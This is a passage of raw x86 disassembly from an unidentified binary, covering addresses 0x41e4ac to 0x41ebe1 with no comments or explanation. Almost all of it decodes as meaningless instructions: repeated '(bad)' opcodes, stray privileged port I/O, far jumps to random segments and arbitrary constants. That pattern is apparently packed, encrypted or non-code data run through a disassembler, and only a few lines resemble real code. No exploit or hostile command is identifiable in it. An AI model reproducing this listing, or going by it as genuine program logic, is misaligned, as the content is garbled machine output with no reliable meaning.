  41e4ac:	pop    ecx
  41e4ad:	cmp    eax,0x235bd07e
  41e4b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4b3:	(bad)  
  41e4b4:	pop    esi
  41e4b5:	sbb    edi,ecx
  41e4b7:	cmc    
  41e4b8:	je     0x41e4df
  41e4ba:	add    bh,BYTE PTR [esi]
  41e4bc:	pop    edx
  41e4bd:	repnz and al,0x6
  41e4c0:	sub    eax,DWORD PTR [edi+0x70566040]
  41e4c6:	mov    ch,0xba
  41e4c8:	mov    ds:0xac40774e,eax
  41e4cd:	inc    esi
  41e4ce:	ror    DWORD PTR [ecx-0x58],0xc4
  41e4d2:	xchg   ebp,eax
  41e4d3:	mov    dl,0xa
  41e4d5:	adc    dh,BYTE PTR ds:0xe194ae2d
  41e4db:	adc    dl,bl
  41e4dd:	(bad)  
  41e4de:	mov    WORD PTR [ecx],cs
  41e4e0:	inc    eax
  41e4e1:	sti    
  41e4e2:	sbb    DWORD PTR [esi-0x22],0x3e
  41e4e6:	int    0x45
  41e4e8:	in     al,dx
  41e4e9:	rcl    esp,1
  41e4eb:	and    DWORD PTR [edi-0x2],0x73
  41e4ef:	mov    eax,ds:0x92e2a08f
  41e4f4:	jp     0x41e4d7
  41e4f6:	jne    0x41e567
  41e4f8:	mov    DWORD PTR [edx],0x8dee4629
  41e4fe:	fwait
  41e4ff:	and    al,0x4
  41e501:	setns  BYTE PTR [ecx+eax*4]
  41e505:	cli    
  41e506:	sbb    ch,BYTE PTR [ecx-0x7a]
  41e509:	nop
  41e50a:	pop    esp
  41e50b:	iret   
  41e50c:	fsub   st(6),st
  41e50e:	xor    DWORD PTR [eax-0x7177d7d4],esi
  41e514:	sub    edx,DWORD PTR [edi+edx*4]
  41e517:	and    eax,0x9aadd898
  41e51c:	or     al,0xd1
  41e51e:	and    eax,DWORD PTR [esi+0x28ddf8a5]
  41e524:	or     eax,DWORD PTR [eax]
  41e526:	mov    ah,BYTE PTR [edi-0x5d0cc4e5]
  41e52c:	rep outs dx,DWORD PTR ds:[esi]
  41e52e:	cmp    al,0xe2
  41e530:	in     al,0xe
  41e532:	stos   BYTE PTR es:[edi],al
  41e533:	lds    edi,FWORD PTR [eax]
  41e535:	and    BYTE PTR [ecx+0x11],0x3
  41e539:	inc    esp
  41e53a:	jns    0x41e5b3
  41e53c:	cmp    edi,edi
  41e53e:	xor    al,bl
  41e540:	or     dh,BYTE PTR [esi+edi*2]
  41e543:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e544:	push   esp
  41e545:	push   ebp
  41e546:	add    edi,DWORD PTR [edi+eiz*1+0x122e28b3]
  41e54d:	ss inc ebp
  41e54f:	adc    ecx,edi
  41e551:	xchg   edi,eax
  41e552:	pusha  
  41e553:	jecxz  0x41e52b
  41e555:	fwait
  41e556:	cld    
  41e557:	out    0x14,al
  41e559:	test   eax,0x761d036e
  41e55e:	add    BYTE PTR cs:[ecx+ecx*4-0x46bf5dd4],bh
  41e566:	dec    eax
  41e567:	sbb    ch,dl
  41e569:	sbb    ebx,DWORD PTR [eax+0x6018584f]
  41e56f:	pop    ebx
  41e570:	fld    QWORD PTR [edx+0x241dcd2b]
  41e576:	mov    BYTE PTR [edi],al
  41e578:	adc    BYTE PTR [ebp-0x62a9ca19],dl
  41e57e:	adc    BYTE PTR [ebp+0x56],al
  41e581:	pop    esp
  41e582:	(bad)  
  41e584:	xor    al,0xbe
  41e586:	aas    
  41e587:	sbb    BYTE PTR [edx+0x11a25667],dl
  41e58d:	add    eax,0xb65c3705
  41e592:	shl    DWORD PTR [esi+edx*1],0xf8
  41e596:	popf   
  41e597:	cmp    al,0xf6
  41e599:	aas    
  41e59a:	mov    ds:0xbb9eb8b0,eax
  41e59f:	cwde   
  41e5a0:	or     esi,DWORD PTR [ebp+eax*8+0x77864f78]
  41e5a7:	and    DWORD PTR [ecx],edx
  41e5a9:	mul    DWORD PTR [eax-0x2a40c1f9]
  41e5af:	stos   BYTE PTR es:[edi],al
  41e5b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5b1:	pop    esi
  41e5b2:	loope  0x41e56f
  41e5b4:	push   eax
  41e5b5:	push   edi
  41e5b6:	pop    eax
  41e5b7:	xchg   edx,eax
  41e5b8:	lea    ebx,[edx+0x66562a76]
  41e5be:	jmp    0xd319:0x642c845c
  41e5c5:	xor    cl,BYTE PTR [ebp+esi*4+0x412a3133]
  41e5cc:	shl    DWORD PTR [eax-0x21],0xae
  41e5d0:	leave  
  41e5d1:	sbb    esp,edx
  41e5d3:	jg     0x41e5f0
  41e5d5:	mov    esi,0x5b2f68de
  41e5da:	inc    esi
  41e5db:	cdq    
  41e5dc:	inc    ecx
  41e5dd:	data16 aas 
  41e5df:	mov    ecx,DWORD PTR [eax+0x73]
  41e5e2:	fist   DWORD PTR ds:0x835b76fc
  41e5e8:	jmp    FWORD PTR [esi]
  41e5ea:	fimul  WORD PTR [eax]
  41e5ec:	push   esp
  41e5ed:	mov    ds:0xa5174f3a,al
  41e5f2:	mov    BYTE PTR [ebp-0x5fcb0afa],ch
  41e5f8:	mov    al,0x5a
  41e5fa:	mov    bl,0x3e
  41e5fc:	xchg   edx,eax
  41e5fd:	nop
  41e5fe:	add    ecx,DWORD PTR ds:[ebx-0x5f]
  41e602:	ins    BYTE PTR es:[edi],dx
  41e603:	xor    eax,0x5e5721c1
  41e608:	lea    esi,[esi+edi*2]
  41e60b:	out    0xc1,eax
  41e60d:	ret    
  41e60e:	adc    al,0x1e
  41e610:	loope  0x41e612
  41e612:	push   ss
  41e613:	add    cl,bh
  41e615:	sub    eax,0xfba863d6
  41e61a:	loop   0x41e5c9
  41e61c:	xor    al,0xb1
  41e61e:	scas   eax,DWORD PTR es:[edi]
  41e61f:	mov    edx,DWORD PTR [edi+0x4b]
  41e622:	test   eax,0xb675d29c
  41e627:	pushf  
  41e628:	daa    
  41e629:	mov    bh,0xe2
  41e62b:	test   BYTE PTR [esi],al
  41e62d:	fadd   st,st(3)
  41e62f:	popa   
  41e630:	mov    cl,0x19
  41e632:	push   es
  41e633:	fist   DWORD PTR [esp+ebx*2]
  41e636:	mov    bh,0xe2
  41e638:	in     al,dx
  41e639:	cli    
  41e63a:	jno    0x41e66f
  41e63c:	dec    edi
  41e63d:	lock imul ebx,DWORD PTR [edx+edi*1+0x49],0x57
  41e643:	aas    
  41e644:	movaps XMMWORD PTR [edi+0x6c],xmm0
  41e648:	cmc    
  41e649:	scas   al,BYTE PTR es:[edi]
  41e64a:	test   al,0x11
  41e64c:	dec    ecx
  41e64d:	fild   DWORD PTR [edx-0x59]
  41e650:	or     eax,0x198ec49a
  41e655:	or     al,0xb
  41e657:	mov    ecx,0x8a379022
  41e65c:	mov    al,ds:0xe6fa0c9e
  41e661:	jo     0x41e613
  41e663:	sub    bl,dh
  41e665:	clc    
  41e666:	pop    ecx
  41e667:	cli    
  41e668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e669:	adc    eax,0x8ba2f8db
  41e66e:	jno    0x41e5f4
  41e670:	jmp    0x41e681
  41e672:	(bad)  
  41e674:	push   ds
  41e675:	mov    ebp,0x26c8ff77
  41e67a:	dec    edx
  41e67b:	outs   dx,BYTE PTR ds:[esi]
  41e67c:	das    
  41e67d:	test   eax,0x8f535881
  41e682:	pusha  
  41e683:	adc    al,0x52
  41e685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e686:	mov    ebx,0x4d6d3a65
  41e68b:	jnp    0x41e6b8
  41e68d:	sbb    al,BYTE PTR [ecx]
  41e68f:	dec    edi
  41e690:	icebp  
  41e691:	imul   edx,DWORD PTR [eax+edi*2],0x38e68e6b
  41e698:	sbb    al,0xe9
  41e69a:	xchg   esi,eax
  41e69b:	rcl    DWORD PTR [esi],1
  41e69d:	pop    esi
  41e69e:	mov    DWORD PTR [ebp-0x49],eax
  41e6a1:	dec    edi
  41e6a2:	mov    ebx,eax
  41e6a4:	xor    eax,0xb73caa62
  41e6a9:	retf   
  41e6aa:	in     al,dx
  41e6ab:	mov    ebp,0x4a1c8d3d
  41e6b0:	fmulp  st(0),st
  41e6b2:	test   al,0x80
  41e6b4:	xchg   ebx,eax
  41e6b5:	lock pop ebp
  41e6b7:	xchg   DWORD PTR [eax+ebx*8],esp
  41e6ba:	lods   al,BYTE PTR ds:[esi]
  41e6bb:	ins    DWORD PTR es:[edi],dx
  41e6bc:	mov    ah,0xe2
  41e6be:	xchg   ebx,eax
  41e6bf:	pop    ds
  41e6c0:	push   edi
  41e6c1:	shr    BYTE PTR [esp+ecx*1+0x7e],1
  41e6c5:	xchg   ebx,eax
  41e6c6:	add    dh,BYTE PTR [edi]
  41e6c8:	lea    esp,[edi]
  41e6ca:	pop    ebp
  41e6cb:	xor    BYTE PTR [ebx+ebp*4+0x6aa4db02],cl
  41e6d2:	imul   eax,DWORD PTR [ebx-0x2c689dff],0x45b23ed2
  41e6dc:	aad    0x1e
  41e6de:	rcl    BYTE PTR [eax+0x75],1
  41e6e1:	jl     0x41e6ff
  41e6e3:	mov    ebx,0x900ad0f6
  41e6e8:	jo     0x41e683
  41e6ea:	or     DWORD PTR [esi+0x2fe2949c],edx
  41e6f0:	pop    ecx
  41e6f1:	aas    
  41e6f2:	jmp    0x5aeb:0x32ce2b43
  41e6f9:	xlat   BYTE PTR ds:[ebx]
  41e6fa:	mov    ds,WORD PTR [eax-0x77347f64]
  41e700:	sub    eax,ecx
  41e702:	mov    ch,0x6d
  41e704:	and    al,0xa2
  41e706:	inc    esi
  41e707:	dec    ebp
  41e708:	adc    esp,DWORD PTR [ebx+0x4c91e71d]
  41e70e:	shl    dh,0x3b
  41e711:	dec    edx
  41e712:	mov    esi,0x92a348d2
  41e717:	ja     0x41e6f7
  41e719:	cmp    bh,al
  41e71b:	push   eax
  41e71c:	push   0x522448c2
  41e721:	retf   
  41e722:	and    ah,al
  41e724:	or     ebx,DWORD PTR [esi-0x9c112ef]
  41e72a:	sbb    eax,DWORD PTR ds:0xab4f89a5
  41e730:	aad    0x5a
  41e732:	xchg   ecx,eax
  41e733:	test   bh,ch
  41e735:	ror    BYTE PTR [ecx],1
  41e737:	sub    BYTE PTR [ebx+0x5666be3b],al
  41e73d:	adc    al,0x19
  41e73f:	adc    BYTE PTR [ebx+0x8262c05],cl
  41e745:	jge    0x41e6eb
  41e747:	lock push 0x2c
  41e74a:	sub    dh,bh
  41e74c:	jo     0x41e7a3
  41e74e:	pop    ss
  41e74f:	cmp    DWORD PTR [ecx+0x6d9e5a36],esi
  41e755:	into   
  41e756:	daa    
  41e757:	pop    eax
  41e758:	mov    al,ds:0xe9c40de1
  41e75d:	shr    BYTE PTR [ecx+0xff858ed],cl
  41e763:	jl     0x41e743
  41e765:	bound  eax,QWORD PTR [ebx+0x7f0b797c]
  41e76b:	mov    ebx,0x5b61ae36
  41e770:	into   
  41e771:	pop    ss
  41e772:	jge    0x41e7b8
  41e774:	dec    esp
  41e775:	xchg   BYTE PTR [esi],ch
  41e777:	jb     0x41e79b
  41e779:	aaa    
  41e77a:	sub    eax,ebp
  41e77c:	dec    ecx
  41e77d:	sub    eax,DWORD PTR [eax]
  41e77f:	or     eax,0xa1ddb167
  41e784:	dec    esi
  41e785:	in     eax,dx
  41e786:	outs   dx,DWORD PTR ds:[esi]
  41e787:	push   eax
  41e788:	sub    al,0x97
  41e78b:	dec    edx
  41e78c:	pop    ds
  41e78d:	dec    eax
  41e78e:	mov    WORD PTR [ebp-0x7b],fs
  41e791:	adc    ecx,ecx
  41e793:	push   es
  41e794:	mul    ecx
  41e796:	jmp    0x18a975d7
  41e79b:	sbb    al,0xa8
  41e79d:	imul   esi,DWORD PTR [ebx+edi*1],0xffffffd3
  41e7a1:	push   0xedd54ae3
  41e7a6:	inc    ebp
  41e7a7:	outs   dx,DWORD PTR ds:[esi]
  41e7a8:	jno    0x41e7e3
  41e7aa:	ja     0x41e7d5
  41e7ac:	aaa    
  41e7ad:	out    0xf5,eax
  41e7af:	mov    ?,edi
  41e7b1:	sar    esi,1
  41e7b3:	rol    BYTE PTR [ecx+eax*1-0x7d],1
  41e7b7:	stos   BYTE PTR es:[edi],al
  41e7b8:	xor    ah,bh
  41e7ba:	imul   ecx,DWORD PTR [esi-0x4d0216bc],0x332c334e
  41e7c4:	loopne 0x41e74c
  41e7c6:	repnz or bl,0xe
  41e7ca:	sub    bl,dl
  41e7cc:	mov    dh,bh
  41e7ce:	jle    0x41e7fb
  41e7d0:	push   esi
  41e7d1:	repnz stos BYTE PTR es:[edi],al
  41e7d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7d4:	push   eax
  41e7d5:	mov    ebx,0x485dcd8
  41e7da:	loopne 0x41e80b
  41e7dc:	cmp    DWORD PTR [ecx+0x3b4ba358],0xffffffa9
  41e7e3:	lods   al,BYTE PTR ds:[esi]
  41e7e4:	lock push ecx
  41e7e6:	xchg   ebx,eax
  41e7e7:	in     eax,dx
  41e7e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7e9:	rcr    DWORD PTR [esi-0x71352296],1
  41e7ef:	shl    BYTE PTR [edi],0x63
  41e7f2:	dec    esp
  41e7f3:	adc    eax,0x3f9dadba
  41e7f8:	or     ch,BYTE PTR [esi-0x7c]
  41e7fb:	xchg   esp,eax
  41e7fc:	daa    
  41e7fd:	aam    0x23
  41e7ff:	jmp    0x41e7d6
  41e801:	pop    esi
  41e802:	or     cl,BYTE PTR [edx+0x693f9434]
  41e808:	push   ebx
  41e809:	push   edi
  41e80a:	call   0x41594e
  41e80f:	mov    esi,DWORD PTR [ebp-0x228]
  41e815:	cmp    esi,eax
  41e817:	jmp    0x41ebfe
  41e81c:	mov    dh,0x8
  41e81e:	xor    al,0xa5
  41e820:	mov    ah,0xb9
  41e822:	mov    esp,0xddc4c918
  41e827:	nop
  41e828:	xor    eax,0xa7924c9b
  41e82d:	outs   dx,DWORD PTR ds:[esi]
  41e82e:	sar    BYTE PTR [esi-0x41413bb6],0x77
  41e835:	add    esi,ebx
  41e837:	ficomp DWORD PTR [ecx-0x7586a321]
  41e83d:	dec    esp
  41e83e:	sbb    al,0x1b
  41e840:	test   BYTE PTR [esi],dh
  41e842:	add    esp,DWORD PTR [eax]
  41e844:	mov    esp,0xb735819c
  41e849:	les    ecx,FWORD PTR [edi-0x495a3432]
  41e84f:	sub    edx,ebx
  41e851:	xor    ebx,DWORD PTR [edi+0x69]
  41e854:	pop    ecx
  41e855:	cmp    eax,0x52255b4
  41e85a:	jbe    0x41e8c7
  41e85c:	jns    0x41e7e4
  41e85e:	int    0xd3
  41e860:	jle    0x41e84d
  41e862:	iret   
  41e863:	dec    eax
  41e864:	mov    dh,0x2b
  41e866:	rol    ebp,1
  41e868:	jne    0x41e88f
  41e86a:	lds    edi,FWORD PTR [ebp+0x4f]
  41e86d:	dec    ecx
  41e86e:	dec    eax
  41e86f:	js     0x41e872
  41e871:	pop    ss
  41e872:	push   edi
  41e873:	jne    0x41e8d1
  41e875:	pop    esi
  41e876:	adc    esi,DWORD PTR [edi+0xc]
  41e879:	loop   0x41e825
  41e87b:	dec    esp
  41e87c:	cmp    ecx,ebp
  41e87e:	sub    al,ch
  41e880:	fimul  WORD PTR [ebp-0xb]
  41e883:	pop    ebp
  41e884:	mov    ch,0x75
  41e886:	shl    BYTE PTR [edi],cl
  41e888:	mov    DWORD PTR [edi+0x15],esi
  41e88b:	outs   dx,DWORD PTR ds:[esi]
  41e88c:	retf   0xc492
  41e88f:	pop    ecx
  41e890:	adc    ch,cl
  41e892:	cmc    
  41e893:	fisttp QWORD PTR [ebp+0x13]
  41e896:	cmp    edx,ecx
  41e898:	xor    eax,0xa1105956
  41e89d:	inc    ecx
  41e89e:	test   BYTE PTR [ebx+0x63],dl
  41e8a1:	daa    
  41e8a2:	neg    bl
  41e8a4:	out    dx,eax
  41e8a5:	pop    ebp
  41e8a6:	xlat   BYTE PTR ds:[ebx]
  41e8a7:	fnstsw ax
  41e8a9:	mov    ds:0x18508696,al
  41e8ae:	imul   edx,DWORD PTR [ebx-0x51],0x4
  41e8b2:	dec    ebp
  41e8b3:	repz adc ah,BYTE PTR [esi+0x1340bd5c]
  41e8ba:	push   eax
  41e8bb:	inc    edx
  41e8bc:	adc    BYTE PTR [ebp-0x2f314071],bh
  41e8c2:	jl     0x41e889
  41e8c4:	mov    bh,0x4c
  41e8c6:	mov    cl,BYTE PTR [edi-0x4572ae2b]
  41e8cc:	adc    eax,0x841cc851
  41e8d1:	xor    BYTE PTR ds:0xf732ce3a,dl
  41e8d7:	sub    BYTE PTR [edx],bl
  41e8d9:	sub    esi,edx
  41e8db:	daa    
  41e8dc:	cmp    BYTE PTR [edx+0x4057115e],0xf1
  41e8e3:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41e8e5:	dec    ebp
  41e8e6:	mov    esi,0x50ca5a0d
  41e8eb:	ror    BYTE PTR [esi-0x3b7e8a26],1
  41e8f1:	sbb    BYTE PTR [ecx-0x23c25677],dl
  41e8f7:	pop    ebx
  41e8f8:	int3   
  41e8f9:	and    DWORD PTR [edi],esp
  41e8fb:	and    dh,dl
  41e8fd:	sbb    DWORD PTR [eax-0x498a7d74],edx
  41e903:	inc    ebx
  41e904:	lds    eax,FWORD PTR [eax+0x27dedd64]
  41e90a:	in     al,0x1b
  41e90c:	(bad)  
  41e90e:	mov    ebp,0xd20ea799
  41e913:	(bad)  [edi-0x532539c6]
  41e919:	ins    BYTE PTR es:[edi],dx
  41e91a:	pusha  
  41e91b:	mov    eax,ds:0xcba5ded2
  41e920:	sub    DWORD PTR [edi],eax
  41e922:	(bad)  
  41e923:	ss push esp
  41e925:	xchg   edx,eax
  41e926:	pop    esi
  41e927:	inc    eax
  41e928:	outs   dx,DWORD PTR ds:[esi]
  41e929:	mov    ebp,0xf6172809
  41e92e:	jp     0x41e8b7
  41e930:	push   ecx
  41e931:	mov    dh,0xcf
  41e933:	jl     0x41e99d
  41e935:	repnz add al,0xa5
  41e938:	inc    esp
  41e939:	inc    ebp
  41e93a:	ja     0x41e916
  41e93c:	enter  0x5b7b,0x52
  41e940:	sub    ebp,DWORD PTR [edx+0x7b340d0e]
  41e946:	imul   esp,esi,0x6fe931e4
  41e94c:	fcmovnb st,st(4)
  41e94e:	lods   al,BYTE PTR ds:[esi]
  41e94f:	pop    ss
  41e950:	das    
  41e951:	pop    esp
  41e952:	mov    dl,0x33
  41e954:	mov    ds:0x5896f9a3,eax
  41e959:	push   esi
  41e95a:	outs   dx,DWORD PTR ds:[esi]
  41e95b:	jne    0x41e967
  41e95d:	cmp    BYTE PTR ds:0x1072a67e,0xf
  41e964:	pop    esp
  41e965:	jnp    0x41e965
  41e967:	dec    edx
  41e968:	shl    dh,0x83
  41e96b:	pop    ecx
  41e96c:	and    al,0x3e
  41e96e:	sub    al,0xc1
  41e970:	xchg   DWORD PTR [edi-0x45],ebp
  41e973:	arpl   WORD PTR [edx+0x1e],dx
  41e976:	jmp    0x41e9ec
  41e978:	int3   
  41e979:	and    al,0xfe
  41e97b:	add    eax,DWORD PTR [edx+0x31]
  41e97e:	out    0x8f,al
  41e980:	xchg   esi,eax
  41e981:	stc    
  41e982:	jmp    0xe515:0xe639f4f0
  41e989:	mov    dh,0x40
  41e98b:	ss out dx,eax
  41e98d:	addr16 push esp
  41e98f:	jo     0x41e9ee
  41e991:	jnp    0x41e97f
  41e993:	and    eax,0xd6eed6e9
  41e998:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e999:	cli    
  41e99a:	es int 0xc0
  41e99d:	adc    eax,0x53a48076
  41e9a2:	push   ss
  41e9a3:	jle    0x41e9d8
  41e9a5:	cs lock push eax
  41e9a8:	popf   
  41e9a9:	mov    al,ds:0xb98b8ac9
  41e9ae:	outs   dx,DWORD PTR ds:[esi]
  41e9af:	stc    
  41e9b0:	call   0x45596d2d
  41e9b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9b6:	mov    WORD PTR [ecx+0x4b],cs
  41e9b9:	jp     0x41e9b6
  41e9bb:	dec    ebx
  41e9bc:	adc    edi,eax
  41e9be:	cmp    DWORD PTR [ecx-0x2d],0xfffffff2
  41e9c2:	inc    ebx
  41e9c3:	sub    ecx,DWORD PTR [edx+0x4]
  41e9c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9c7:	add    eax,0xeae266b2
  41e9cc:	pop    ebx
  41e9cd:	jns    0x41ea16
  41e9cf:	or     eax,0xe9e77d1f
  41e9d4:	fwait
  41e9d5:	mov    ebx,0xeed2408f
  41e9da:	leave  
  41e9db:	out    0x58,eax
  41e9dd:	jle    0x41e993
  41e9df:	jns    0x41ea50
  41e9e1:	and    al,0x47
  41e9e3:	fmulp  st(5),st
  41e9e5:	mov    DWORD PTR [edi-0x2c076007],0xb7447b85
  41e9ef:	scas   al,BYTE PTR es:[edi]
  41e9f0:	mov    dh,0xc4
  41e9f2:	jae    0x41e97f
  41e9f4:	lods   al,BYTE PTR ds:[esi]
  41e9f5:	daa    
  41e9f6:	std    
  41e9f7:	inc    ebx
  41e9f8:	(bad)  
  41e9f9:	xlat   BYTE PTR ds:[ebx]
  41e9fa:	xor    ecx,eax
  41e9fc:	and    al,0x7d
  41e9fe:	jae    0x41e9fe
  41ea00:	repnz xchg esi,eax
  41ea02:	push   edx
  41ea03:	stc    
  41ea04:	dec    esp
  41ea05:	add    BYTE PTR [edi-0x2f],dh
  41ea08:	scas   al,BYTE PTR es:[edi]
  41ea09:	xchg   ebp,eax
  41ea0a:	(bad)  
  41ea0b:	fmulp  st(7),st
  41ea0d:	sub    DWORD PTR [edi+0x1c],eax
  41ea10:	dec    esp
  41ea11:	sahf   
  41ea12:	mov    ebx,0x48d68c1a
  41ea17:	data16 xor al,0x13
  41ea1a:	mov    eax,esp
  41ea1c:	je     0x41e9bb
  41ea1e:	scas   eax,DWORD PTR es:[edi]
  41ea1f:	popf   
  41ea20:	mov    ch,BYTE PTR [ebp+0x2a]
  41ea23:	cdq    
  41ea24:	xor    eax,0x6365796c
  41ea29:	das    
  41ea2a:	aas    
  41ea2b:	shl    BYTE PTR [esi-0x64aa0728],0xb3
  41ea32:	mov    ebx,0x72e3ba94
  41ea37:	fsubr  DWORD PTR [edx-0x4aae5f88]
  41ea3d:	fild   DWORD PTR [ecx]
  41ea3f:	xchg   esi,eax
  41ea40:	or     edx,DWORD PTR [ecx-0x30]
  41ea43:	lea    ecx,[edx-0x63]
  41ea46:	cmp    al,BYTE PTR [edi]
  41ea48:	out    dx,al
  41ea49:	xor    esi,DWORD PTR [ebp+ebp*4+0x3d15ef3b]
  41ea50:	cli    
  41ea51:	nop
  41ea52:	mov    ch,0xdf
  41ea54:	mov    ch,0x94
  41ea56:	inc    edx
  41ea57:	arpl   WORD PTR [eax-0x32],cx
  41ea5a:	and    al,0xa6
  41ea5c:	arpl   WORD PTR [edx-0x729a0007],bp
  41ea62:	xor    edi,esp
  41ea64:	loopne 0x41eae1
  41ea66:	or     ah,BYTE PTR [edi-0x63]
  41ea69:	jae    0x41ea09
  41ea6b:	mov    eax,ds:0x1cbd90e4
  41ea70:	cwde   
  41ea71:	pop    ds
  41ea72:	and    ch,0x38
  41ea75:	sub    DWORD PTR ds:0xa8989e12,0x49
  41ea7c:	dec    ebp
  41ea7d:	adc    bl,al
  41ea7f:	loop   0x41eabd
  41ea81:	xor    edx,DWORD PTR [ecx]
  41ea83:	cs inc esi
  41ea85:	fnstsw WORD PTR [edi-0x2f5c26a3]
  41ea8b:	nop
  41ea8c:	adc    eax,0xf7474ba5
  41ea91:	je     0x41eb0b
  41ea93:	(bad)  
  41ea94:	xchg   esp,eax
  41ea95:	adc    bh,BYTE PTR [eax+eiz*8]
  41ea98:	test   eax,0x1c44dc80
  41ea9d:	(bad)  
  41ea9e:	push   esp
  41ea9f:	inc    edx
  41eaa0:	lods   al,BYTE PTR ds:[esi]
  41eaa1:	sub    bh,BYTE PTR [edx+0x2acb0e62]
  41eaa7:	ror    ebp,0xd4
  41eaaa:	push   esi
  41eaab:	lods   al,BYTE PTR ds:[esi]
  41eaac:	ror    BYTE PTR [eax],1
  41eaae:	xor    DWORD PTR [esi+ebx*8],ebx
  41eab1:	das    
  41eab2:	adc    ebp,DWORD PTR [eax]
  41eab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eab5:	nop
  41eab6:	(bad)  
  41eab8:	jo     0x41ead7
  41eaba:	call   0xa9d85070
  41eabf:	shl    BYTE PTR [edi],cl
  41eac1:	cmp    BYTE PTR [edi-0x6badb7e6],ch
  41eac7:	inc    esi
  41eac8:	add    DWORD PTR [esi-0x29],ebp
  41eacb:	repnz out dx,al
  41eacd:	xchg   esi,eax
  41eace:	outs   dx,BYTE PTR ds:[esi]
  41eacf:	dec    esi
  41ead0:	sub    ecx,DWORD PTR [esi+ebp*8-0x375cafde]
  41ead7:	mov    eax,ds:0xc9bb9c5c
  41eadc:	adc    al,0xc5
  41eade:	lahf   
  41eadf:	ret    
  41eae0:	je     0x41eadd
  41eae2:	mov    ah,0xfc
  41eae4:	in     eax,dx
  41eae5:	cmc    
  41eae6:	les    eax,FWORD PTR [eax]
  41eae8:	fstp   TBYTE PTR [ebx]
  41eaea:	add    al,0xff
  41eaec:	das    
  41eaed:	add    al,0xe
  41eaef:	cmp    edx,esp
  41eaf1:	imul   ecx,DWORD PTR [ecx-0x28],0xf3725102
  41eaf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eaf9:	cmp    eax,0x6e4344e5
  41eafe:	enter  0x72e,0xf5
  41eb02:	ss pusha 
  41eb04:	fmul   st,st(0)
  41eb06:	cmp    eax,0x90744032
  41eb0b:	adc    al,0x8
  41eb0d:	out    dx,eax
  41eb0e:	inc    edi
  41eb0f:	inc    ebx
  41eb10:	push   es
  41eb11:	mov    WORD PTR [ebx+0x5ce68a4b],?
  41eb17:	or     DWORD PTR [edx-0x2b],0xfffffff1
  41eb1b:	adc    al,0x6d
  41eb1d:	lods   eax,DWORD PTR fs:[esi]
  41eb1f:	shr    cl,0x5b
  41eb22:	repnz dec eax
  41eb24:	sub    bl,BYTE PTR [esi-0x7d]
  41eb27:	mov    edx,0x248618c5
  41eb2c:	imul   DWORD PTR [esp+esi*8]
  41eb2f:	jg     0x41eabd
  41eb31:	fdiv   QWORD PTR [esi]
  41eb33:	pop    ecx
  41eb34:	in     al,dx
  41eb35:	int3   
  41eb36:	sti    
  41eb37:	push   esp
  41eb38:	and    esp,edx
  41eb3a:	retf   0x159f
  41eb3d:	fnstenv [ebx-0x4f]
  41eb40:	popf   
  41eb41:	loop   0x41ebbf
  41eb43:	adc    eax,0x8c8655ec
  41eb48:	test   al,0x66
  41eb4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb4b:	pop    ds
  41eb4c:	ins    DWORD PTR es:[edi],dx
  41eb4d:	inc    edx
  41eb4e:	cmc    
  41eb4f:	sbb    BYTE PTR [ecx+edi*1-0xae87421],bh
  41eb56:	inc    ebx
  41eb57:	pop    edi
  41eb58:	test   BYTE PTR [ebx-0x7f],0x8c
  41eb5c:	mul    ebp
  41eb5e:	dec    edx
  41eb5f:	xor    dl,BYTE PTR ds:0xee6df7e0
  41eb65:	sbb    al,0x19
  41eb67:	loope  0x41eb70
  41eb69:	add    ch,BYTE PTR [ecx-0x72]
  41eb6c:	hlt    
  41eb6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb6e:	sbb    esp,esp
  41eb70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb71:	sub    al,al
  41eb73:	xchg   cl,ch
  41eb75:	fld    DWORD PTR [edx+0x72]
  41eb79:	push   ebp
  41eb7a:	daa    
  41eb7b:	and    al,0x5e
  41eb7d:	push   0x73203525
  41eb82:	into   
  41eb83:	int3   
  41eb84:	into   
  41eb85:	dec    ebx
  41eb86:	lds    esi,FWORD PTR [edi]
  41eb88:	mov    esp,0xc73373ef
  41eb8d:	sbb    al,ch
  41eb8f:	push   edx
  41eb90:	test   al,0x5f
  41eb92:	mov    eax,0xb900b6fd
  41eb97:	sub    DWORD PTR [ebx-0x80a7820],esi
  41eb9d:	lahf   
  41eb9e:	adc    edi,DWORD PTR [edx]
  41eba0:	add    edx,esp
  41eba2:	xor    DWORD PTR [edx+0x18d42a16],0x54
  41eba9:	icebp  
  41ebaa:	pop    ss
  41ebab:	sub    al,0x93
  41ebad:	and    eax,DWORD PTR [ebx+0x6c]
  41ebb0:	in     eax,dx
  41ebb1:	(bad)  
  41ebb2:	fdiv   QWORD PTR [edx+0x74]
  41ebb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebb6:	push   esp
  41ebb7:	sub    BYTE PTR [edx],dh
  41ebb9:	jnp    0x41eb8b
  41ebbb:	push   esp
  41ebbc:	stc    
  41ebbd:	pop    ss
  41ebbe:	out    dx,eax
  41ebbf:	mov    cl,0xcc
  41ebc1:	or     DWORD PTR ds:0xe3b578b4,edx
  41ebc7:	pop    ebp
  41ebc8:	pop    ebx
  41ebc9:	mov    esi,0xa888f59
  41ebce:	stos   BYTE PTR es:[edi],al
  41ebcf:	lock adc ebp,DWORD PTR [edi-0x21]
  41ebd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebd4:	jecxz  0x41ebd0
  41ebd6:	pop    esi
  41ebd7:	and    BYTE PTR [ebx+esi*4-0x6],0x7c
  41ebdc:	adc    BYTE PTR [ebx],cl
  41ebde:	mov    gs,WORD PTR [ecx-0x35]
  41ebe1:	jbe    0x41ec05
